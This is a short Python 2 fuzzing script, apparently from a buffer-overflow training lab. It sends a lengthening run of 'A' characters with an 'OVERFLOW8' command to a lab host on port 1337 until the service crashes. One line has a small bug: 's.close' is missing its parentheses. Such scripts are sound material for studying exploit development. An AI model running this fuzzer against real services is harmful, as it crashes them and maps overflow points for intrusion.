#!/usr/bin/python
import sys
import socket
from time import sleep
buffer = "A" * 100
while True:
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect(('10.10.224.209', 1337)) # change ip and port here
 		s.send(('OVERFLOW8 /.:/') + buffer)
 		s.close
 		sleep(1)
 		buffer = buffer + "A" * 100
 	except:
 		print "Fuzzing crashed at %s bytes" % str(len(buffer))
 		sys.exit()
